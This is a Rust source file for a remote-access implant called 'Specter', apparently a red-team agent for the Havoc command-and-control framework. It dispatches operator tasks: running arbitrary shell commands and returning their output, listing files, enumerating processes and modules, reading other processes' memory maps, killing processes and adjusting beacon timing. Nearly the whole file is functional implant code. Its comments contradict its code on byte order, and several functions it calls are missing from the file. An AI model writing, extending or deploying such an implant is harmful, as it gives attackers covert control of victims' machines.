//! Command dispatch and handler implementations for the Specter agent.
//!
//! Routes incoming server task packages to platform-native handler functions and
//! assembles the big-endian response payloads expected by the Havoc teamserver.
//!
//! # Wire endianness
//!
//! * **Server → agent** (incoming task payload): integers are **little-endian**
//!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
//! * **Agent → server** (outgoing response payload): integers are **big-endian**
//!   (`Int32ToBuffer` in the Demon C agent's `Package.c`, parsed by the Go
//!   teamserver's big-endian `parser.NewParser`).

use std::process::{Command as SysCommand, Stdio};
use std::time::UNIX_EPOCH;

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
};
use tracing::{info, warn};

use crate::config::SpecterConfig;

// ─── Result type ─────────────────────────────────────────────────────────────

/// Outcome of dispatching one decoded task package.
#[derive(Debug)]
pub enum DispatchResult {
    /// Send one response packet to the server.
    Respond(Response),
    /// Send multiple response packets (e.g., proc-info + captured output).
    MultiRespond(Vec<Response>),
    /// Cleanly terminate the agent process.
    Exit,
    /// Nothing to send back (no-job, unrecognised command, parse error, …).
    Ignore,
}

/// A single pending agent → server response, ready to be wrapped in a callback
/// envelope and sent over the transport.
#[derive(Debug, Clone)]
pub struct Response {
    /// Demon command ID for the outgoing packet header.
    pub command_id: u32,
    /// Payload bytes already serialised in big-endian wire format.
    pub payload: Vec<u8>,
}

impl Response {
    fn new(cmd: DemonCommand, payload: Vec<u8>) -> Self {
        Self { command_id: cmd.into(), payload }
    }
}

// ─── Top-level dispatch ───────────────────────────────────────────────────────

/// Route a single decoded [`DemonPackage`] to the appropriate handler.
///
/// The [`DispatchResult`] must be transmitted back to the server using the
/// `request_id` from the original package.
pub fn dispatch(package: &DemonPackage, config: &mut SpecterConfig) -> DispatchResult {
    let cmd = match DemonCommand::try_from(package.command_id) {
        Ok(c) => c,
        Err(_) => {
            warn!(command_id = package.command_id, "received unknown command ID — ignoring");
            return DispatchResult::Ignore;
        }
    };

    info!(command = ?cmd, request_id = package.request_id, "dispatching command");

    match cmd {
        DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
        DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
        DemonCommand::CommandFs => handle_fs(&package.payload),
        DemonCommand::CommandProc => handle_proc(&package.payload),
        DemonCommand::CommandProcList => handle_proc_list(&package.payload),
        DemonCommand::CommandNet => handle_net(&package.payload),
        DemonCommand::CommandExit => DispatchResult::Exit,
        // These are agent-to-server callbacks; ignore if received from server.
        DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
        _ => {
            info!(command = ?cmd, "unhandled command — ignoring");
            DispatchResult::Ignore
        }
    }
}

// ─── COMMAND_SLEEP (11) ──────────────────────────────────────────────────────

/// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
///
/// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
/// Outgoing payload (BE): `[delay_ms: u32][jitter_pct: u32]`
fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let delay = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse delay: {e}");
            return DispatchResult::Ignore;
        }
    };
    let jitter = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse jitter: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(delay_ms = delay, jitter_pct = jitter, "sleep interval updated");
    config.sleep_delay_ms = delay;
    config.sleep_jitter = jitter.min(100);

    let mut out = Vec::with_capacity(8);
    write_u32_le(&mut out, delay);
    write_u32_le(&mut out, jitter);
    DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
}

// ─── COMMAND_FS (15) ─────────────────────────────────────────────────────────

/// Dispatch a `CommandFs` task to the appropriate filesystem sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_fs(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandFs: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonFilesystemCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandFs: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandFs dispatch");

    match subcmd {
        DemonFilesystemCommand::GetPwd => handle_fs_pwd(subcmd_raw),
        DemonFilesystemCommand::Cd => handle_fs_cd(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Dir => handle_fs_dir(subcmd_raw, &payload[offset..]),
        _ => {
            info!(subcommand = ?subcmd, "CommandFs: unhandled subcommand — ignoring");
            DispatchResult::Ignore
        }
    }
}

/// `COMMAND_FS / GetPwd (9)` — return the current working directory.
///
/// Outgoing payload (LE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
    let path = match std::env::current_dir() {
        Ok(p) => p.display().to_string(),
        Err(e) => {
            warn!("GetPwd: current_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(path = %path, "GetPwd");

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Cd (4)` — change the working directory.
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
/// Outgoing payload (LE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Cd: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "Cd");

    if let Err(e) = std::env::set_current_dir(&path_str) {
        warn!("Cd: set_current_dir({path_str:?}) failed: {e}");
        return DispatchResult::Ignore;
    }

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_utf16le(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Dir (1)` — list a directory.
///
/// Incoming args (LE) — mirrors Demon C agent parse order:
/// ```text
/// [file_explorer: u32][path: bytes][subdirs: u32][files_only: u32]
/// [dirs_only: u32][list_only: u32]
/// [starts: bytes][contains: bytes][ends: bytes]
/// ```
///
/// Outgoing payload (BE):
/// ```text
/// [subcmd: u32][file_explorer: u32][list_only: u32][path: bytes][success: u32]
/// per dir group:
///   [path: bytes][num_files: u32][num_dirs: u32]
///   (if !list_only) [total_size: u64]
///   per entry:
///     [name: bytes]
///     (if !list_only) [is_dir: u32][size: u64][day][month][year][min][hour]
/// ```
fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    // Parse the full request payload (matches Demon C agent parse order).
    let file_explorer = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Dir: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let _subdirs = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let files_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let dirs_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let list_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    // Name-filter strings (empty = no filter).
    let starts_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let contains_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let ends_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();

    let raw_path = decode_utf16le_null(&path_bytes);

    // Resolve actual directory path (strip trailing wildcard/dot).
    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path.starts_with(".\\") {
        match std::env::current_dir() {
            Ok(p) => p.display().to_string(),
            Err(e) => {
                warn!("Dir: current_dir failed: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        raw_path.trim_end_matches('*').trim_end_matches('/').trim_end_matches('\\').to_string()
    };

    let entries = match std::fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(e) => {
            warn!(path = %dir_path, "Dir: read_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    // Collect entries with metadata and timestamps.
    // Each entry: (name, is_dir, size, day, month, year, minute, hour)
    let mut files: Vec<(String, bool, u64, u32, u32, u32, u32, u32)> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
        let size = meta.as_ref().map_or(0, |m| m.len());

        // Apply files_only / dirs_only filter.
        if files_only && is_dir {
            continue;
        }
        if dirs_only && !is_dir {
            continue;
        }

        // Apply name filters.
        let name_lower = name.to_ascii_lowercase();
        if !starts_filter.is_empty() && !name_lower.starts_with(&starts_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !contains_filter.is_empty()
            && !name_lower.contains(&contains_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !ends_filter.is_empty() && !name_lower.ends_with(&ends_filter.to_ascii_lowercase()) {
            continue;
        }

        // Derive modification timestamps from real file metadata.
        let (day, month, year, minute, hour) = meta
            .as_ref()
            .and_then(|m| m.modified().ok())
            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
            .map(|d| unix_secs_to_ymd_hm(d.as_secs()))
            .unwrap_or((1, 1, 1970, 0, 0));

        files.push((name, is_dir, size, day, month, year, minute, hour));
    }

    let num_files = files.iter().filter(|(_, d, ..)| !d).count() as u32;
    let num_dirs = files.iter().filter(|(_, d, ..)| *d).count() as u32;
    let total_size: u64 = files.iter().filter(|(_, d, ..)| !d).map(|(_, _, s, ..)| *s).sum();

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, u32::from(file_explorer));
    write_u32_le(&mut out, u32::from(list_only));
    write_utf16le(&mut out, &dir_path);
    write_u32_le(&mut out, 1); // success

    // Single directory group.
    write_utf16le(&mut out, &dir_path);
    write_u32_le(&mut out, num_files);
    write_u32_le(&mut out, num_dirs);
    if !list_only {
        out.extend_from_slice(&total_size.to_le_bytes());
    }

    for (name, is_dir, size, day, month, year, minute, hour) in &files {
        write_utf16le(&mut out, name);
        if !list_only {
            write_u32_le(&mut out, u32::from(*is_dir));
            out.extend_from_slice(&size.to_le_bytes());
            write_u32_le(&mut out, *day);
            write_u32_le(&mut out, *month);
            write_u32_le(&mut out, *year);
            write_u32_le(&mut out, *minute);
            write_u32_le(&mut out, *hour);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// Convert a UNIX timestamp (seconds since epoch) to `(day, month, year, minute, hour)`.
///
/// Uses Howard Hinnant's civil-from-days algorithm for the date part.
fn unix_secs_to_ymd_hm(secs: u64) -> (u32, u32, u32, u32, u32) {
    // Days since 1970-01-01 shifted to the civil epoch (Mar 1, year 0).
    let z = (secs / 86400) as i64 + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64; // day of era [0, 146096]
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365; // year of era [0, 399]
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100); // day of year [0, 365]
    let mp = (5 * doy + 2) / 153; // month of year [0, 11]
    let d = doy - (153 * mp + 2) / 5 + 1; // day [1, 31]
    let m = if mp < 10 { mp + 3 } else { mp - 9 }; // month [1, 12]
    let y = if m <= 2 { y + 1 } else { y }; // adjust year for Jan/Feb
    let hour = (secs % 86400 / 3600) as u32;
    let minute = (secs % 3600 / 60) as u32;
    (d as u32, m as u32, y as u32, minute, hour)
}

// ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────

/// Dispatch a `CommandProc` task to the appropriate process sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_proc(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandProc: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonProcessCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandProc: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandProc dispatch");

    match subcmd {
        DemonProcessCommand::Create => handle_proc_create(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Modules => handle_proc_modules(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Grep => handle_proc_grep(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Memory => handle_proc_memory(subcmd_raw, &payload[offset..]),
        DemonProcessCommand::Kill => handle_proc_kill(subcmd_raw, &payload[offset..]),
    }
}

/// `COMMAND_PROC / Create (4)` — execute a command via the native shell.
///
/// The Havoc client sends Windows paths (`cmd.exe /c <cmd>`); on Linux we
/// strip the `/c ` prefix and invoke `/bin/sh -c <cmd>` instead.
///
/// Incoming args (LE):
/// `[state: u32][path: bytes (UTF-16LE)][args: bytes (UTF-16LE)][piped: u32][verbose: u32]`
///
/// Returns two responses (both using the original `request_id`):
/// 1. `CommandProc` — process metadata (path, PID, success, piped, verbose)
/// 2. `CommandOutput` — captured stdout + stderr
fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let process_state = parse_u32_le(rest, &mut offset).unwrap_or(0);

    let process_path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_path = decode_utf16le_null(&process_path_bytes);

    let process_args_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process args: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_args_raw = decode_utf16le_null(&process_args_bytes);

    let piped = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let verbose = parse_u32_le(rest, &mut offset).unwrap_or(0);

    info!(
        path = %process_path,
        args = %process_args_raw,
        piped,
        verbose,
        state = process_state,
        "ProcCreate: executing shell command"
    );

    let (success, pid, output_bytes) = spawn_shell_command(&process_path, &process_args_raw);

    // Response 1: COMMAND_PROC with process metadata
    // LE format: [subcmd][path bytes][pid][success][piped][verbose]
    let mut proc_payload = Vec::new();
    write_u32_le(&mut proc_payload, subcmd_raw);
    write_utf16le(&mut proc_payload, &process_path);
    write_u32_le(&mut proc_payload, pid);
    write_u32_le(&mut proc_payload, u32::from(success));
    write_u32_le(&mut proc_payload, piped);
    write_u32_le(&mut proc_payload, verbose);

    // Response 2: COMMAND_OUTPUT with captured output
    // LE format: [output bytes (UTF-8, length-prefixed)]
    let mut out_payload = Vec::new();
    write_bytes_le(&mut out_payload, &output_bytes);

    DispatchResult::MultiRespond(vec![
        Response::new(DemonCommand::CommandProc, proc_payload),
        Response::new(DemonCommand::CommandOutput, out_payload),
    ])
}

/// Execute a shell command via the platform-native shell and return
/// `(success, child_pid, captured_output)`.
///
/// On **Windows** the command is dispatched through `cmd.exe /c <shell_cmd>`,
/// matching the wire format sent by the Havoc operator console.
///
/// On **Unix** (Linux / macOS — used in CI and cross-compile test builds) the
/// command is translated from the Windows `cmd.exe /c` style and run via
/// `/bin/sh -c`.
#[cfg(windows)]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
    // Extract the bare shell command from the `/c <cmd>` style the Havoc client sends.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via cmd.exe /c");
    match SysCommand::new("cmd.exe")
        .arg("/c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            let output_bytes = match child.wait_with_output() {
                Ok(o) => {
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    combined
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    format!("error: {e}").into_bytes()
                }
            };
            (true, child_pid, output_bytes)
        }
        Err(e) => {
            warn!("ProcCreate: cmd.exe spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    }
}

#[cfg(not(windows))]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
    // Translate Windows cmd.exe /c <cmd> style to a POSIX shell command.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
    match SysCommand::new("/bin/sh")
        .arg("-c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            let output_bytes = match child.wait_with_output() {
                Ok(o) => {
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    combined
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    format!("error: {e}").into_bytes()
                }
            };
            (true, child_pid, output_bytes)
        }
        Err(e) => {
            warn!("ProcCreate: /bin/sh spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    }
}

/// Convert a Windows-style process invocation to a POSIX shell command string.
///
/// The Havoc `shell` client command sends `cmd.exe` as the process path and
/// `/c <command>` as the arguments.  On Linux we strip the `/c ` prefix and
/// run the remainder with `/bin/sh`.  For any other invocation we fall back to
/// running the path directly with the given arguments.
fn translate_to_shell_cmd(path: &str, args: &str) -> String {
    let args_lower = args.to_ascii_lowercase();
    if args_lower.starts_with("/c ") {
        // Typical cmd.exe /c <shell command> path
        return args[3..].to_string();
    }
    if args_lower.starts_with("/c") && args.len() > 2 {
        return args[2..].trim_start().to_string();
    }
    // Not a cmd.exe style invocation: run path with args directly.
    if args.is_empty() { path.to_string() } else { format!("{path} {args}") }
}

// ─── Internal data types ─────────────────────────────────────────────────────

/// One entry in a process list snapshot.
struct ProcessInfo {
    name: String,
    pid: u32,
    ppid: u32,
    session_id: u32,
    num_threads: u32,
    is_wow64: bool,
    user: String,
}

/// One loaded module (DLL / shared library) in a process.
struct ModuleInfo {
    /// Module file name (UTF-8 / ASCII).
    name: String,
    /// Base address of the loaded module image.
    base_addr: u64,
}

/// One result entry from a process-name grep.
struct GrepMatch {
    name: String,
    pid: u32,
    ppid: u32,
    user: String,
    /// Architecture value sent on wire: 86 = x86 (WOW64), 64 = x64 native.
    arch: u32,
}

/// One virtual-memory region from a process address-space query.
struct MemRegion {
    base_addr: u64,
    /// Region size in bytes, truncated to u32 to match Demon's `PackageAddInt32`.
    region_size: u32,
    alloc_protect: u32,
    state: u32,
    mem_type: u32,
}

// ─── Platform-specific process/memory helpers ─────────────────────────────────

// ── Windows ──────────────────────────────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
fn enum_processes() -> Vec<ProcessInfo> {
    use std::mem;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Threading::{
        IsWow64Process, OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
    };

    let mut result = Vec::new();
    // SAFETY: CreateToolhelp32Snapshot, Process32FirstW/NextW, and CloseHandle
    // are safe to call with these arguments; PROCESSENTRY32W is zeroed before use.
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return result;
        }
        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return result;
        }
        loop {
            let null_pos =
                entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
            let name = String::from_utf16_lossy(&entry.szExeFile[..null_pos]).to_string();

            let hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, entry.th32ProcessID);
            let mut is_wow: i32 = 0;
            if hproc != 0 {
                IsWow64Process(hproc, &mut is_wow);
                CloseHandle(hproc);
            }

            result.push(ProcessInfo {
                name,
                pid: entry.th32ProcessID,
                ppid: entry.th32ParentProcessID,
                session_id: 0,
                num_threads: entry.cntThreads,
                is_wow64: is_wow != 0,
                user: String::new(),
            });

            if Process32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    result
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
    use std::mem;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, Module32NextW, TH32CS_SNAPMODULE,
    };

    let mut result = Vec::new();
    // SAFETY: CreateToolhelp32Snapshot, Module32FirstW/NextW, and CloseHandle
    // are safe to call with these arguments; MODULEENTRY32W is zeroed before use.
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
        if snapshot == INVALID_HANDLE_VALUE {
            return result;
        }
        let mut entry: MODULEENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<MODULEENTRY32W>() as u32;
        if Module32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return result;
        }
        loop {
            let null_pos =
                entry.szModule.iter().position(|&c| c == 0).unwrap_or(entry.szModule.len());
            let name = String::from_utf16_lossy(&entry.szModule[..null_pos]).to_string();
            let base_addr = entry.modBaseAddr as u64;
            result.push(ModuleInfo { name, base_addr });
            if Module32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    result
}

#[cfg(windows)]
fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
    let filter_lower = name_filter.to_lowercase();
    enum_processes()
        .into_iter()
        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
        .map(|p| GrepMatch { name: p.name, pid: p.pid, ppid: p.ppid, user: p.user, arch: 64 })
        .collect()
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
    use std::mem;
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Memory::{MEM_FREE, MEMORY_BASIC_INFORMATION, VirtualQueryEx};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let mut result = Vec::new();
    // SAFETY: OpenProcess, VirtualQueryEx, and CloseHandle are called with
    // valid arguments; MEMORY_BASIC_INFORMATION is zeroed before use.
    unsafe {
        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if hprocess == 0 {
            return result;
        }
        let mut offset: usize = 0;
        loop {
            let mut mem_info: MEMORY_BASIC_INFORMATION = mem::zeroed();
            let bytes = VirtualQueryEx(
                hprocess,
                offset as *const _,
                &mut mem_info,
                mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if bytes == 0 {
                break;
            }
            let next_addr = (mem_info.BaseAddress as usize).wrapping_add(mem_info.RegionSize);
            offset = next_addr;

            if mem_info.Type != MEM_FREE && mem_info.AllocationBase as usize != 0 {
                let add = protect_filter == 0 || protect_filter == mem_info.AllocationProtect;
                if add {
                    #[allow(clippy::cast_possible_truncation)]
                    result.push(MemRegion {
                        base_addr: mem_info.BaseAddress as u64,
                        region_size: mem_info.RegionSize as u32,
                        alloc_protect: mem_info.AllocationProtect,
                        state: mem_info.State,
                        mem_type: mem_info.Type,
                    });
                }
            }
        }
        CloseHandle(hprocess);
    }
    result
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn kill_process(pid: u32) -> bool {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_TERMINATE, TerminateProcess};

    // SAFETY: OpenProcess, TerminateProcess, and CloseHandle are called with
    // valid handle values; the handle is closed before return.
    unsafe {
        let hprocess = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if hprocess == 0 {
            return false;
        }
        let success = TerminateProcess(hprocess, 0) != 0;
        CloseHandle(hprocess);
        success
    }
}

// ── Linux / non-Windows ───────────────────────────────────────────────────────

#[cfg(not(windows))]
fn enum_processes() -> Vec<ProcessInfo> {
    let Ok(entries) = std::fs::read_dir("/proc") else { return Vec::new() };
    let mut result = Vec::new();
    for entry in entries.flatten() {
        let fname = entry.file_name();
        let Ok(pid) = fname.to_string_lossy().parse::<u32>() else { continue };
        let status = std::fs::read_to_string(format!("/proc/{pid}/status")).unwrap_or_default();
        let mut name = String::new();
        let mut ppid = 0u32;
        let mut threads = 0u32;
        for line in status.lines() {
            if let Some(v) = line.strip_prefix("Name:\t") {
                name = v.trim().to_string();
            } else if let Some(v) = line.strip_prefix("PPid:\t") {
                ppid = v.trim().parse().unwrap_or(0);
            } else if let Some(v) = line.strip_prefix("Threads:\t") {
                threads = v.trim().parse().unwrap_or(0);
            }
        }
        if name.is_empty() {
            continue;
        }
        result.push(ProcessInfo {
            name,
            pid,
            ppid,
            session_id: 0,
            num_threads: threads,
            is_wow64: false,
            user: String::new(),
        });
    }
    result
}

#[cfg(not(windows))]
fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
    let maps_path =
        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
    let mut seen = std::collections::HashSet::new();
    let mut result = Vec::new();
    for line in content.lines() {
        let mut parts = line.splitn(6, ' ');
        let addr_range = parts.next().unwrap_or("");
        // skip perms, offset, dev, inode
        let _ = parts.next();
        let _ = parts.next();
        let _ = parts.next();
        let _ = parts.next();
        let path = parts.next().map(str::trim).unwrap_or("").trim_start();
        if path.is_empty() || (!path.ends_with(".so") && !path.contains(".so.")) {
            continue;
        }
        if !seen.insert(path.to_string()) {
            continue;
        }
        let base_addr =
            addr_range.split('-').next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        let name = std::path::Path::new(path)
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| path.to_string());
        result.push(ModuleInfo { name, base_addr });
    }
    result
}

#[cfg(not(windows))]
fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
    let filter_lower = name_filter.to_lowercase();
    enum_processes()
        .into_iter()
        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
        .map(|p| GrepMatch { name: p.name, pid: p.pid, ppid: p.ppid, user: p.user, arch: 64 })
        .collect()
}

#[cfg(not(windows))]
fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
    let maps_path =
        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
    // Commit/private/mapped constants mirroring Windows MEM_* values for testing
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_PRIVATE: u32 = 0x2_0000;
    const MEM_MAPPED: u32 = 0x4_0000;
    let mut result = Vec::new();
    for line in content.lines() {
        let mut parts = line.splitn(6, ' ');
        let addr_range = parts.next().unwrap_or("");
        let perms = parts.next().unwrap_or("");
        let mut addr_iter = addr_range.split('-');
        let start = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        let end = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        if end <= start {
            continue;
        }
        let perms_bytes = perms.as_bytes();
        let r = perms_bytes.first().copied() == Some(b'r');
        let w = perms_bytes.get(1).copied() == Some(b'w');
        let x = perms_bytes.get(2).copied() == Some(b'x');
        let alloc_protect: u32 = match (r, w, x) {
            (true, false, true) => 0x20,  // PAGE_EXECUTE_READ
            (true, true, true) => 0x40,   // PAGE_EXECUTE_READWRITE
            (true, true, false) => 0x04,  // PAGE_READWRITE
            (true, false, false) => 0x02, // PAGE_READONLY
            _ => 0x01,                    // PAGE_NOACCESS
        };
        if protect_filter != 0 && protect_filter != alloc_protect {
            continue;
        }
        let is_shared = perms_bytes.get(3).copied() == Some(b's');
        let mem_type = if is_shared { MEM_MAPPED } else { MEM_PRIVATE };
        #[allow(clippy::cast_possible_truncation)]
        let region_size = (end - start).min(u64::from(u32::MAX)) as u32;
        result.push(MemRegion {
            base_addr: start,
            region_size,
            alloc_protect,
            state: MEM_COMMIT,
            mem_type,
        });
    }
    result
}

#[cfg(not(windows))]
fn kill_process(pid: u32) -> bool {
    SysCommand::new("kill")
        .arg("-9")
        .arg(pid.to_string())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

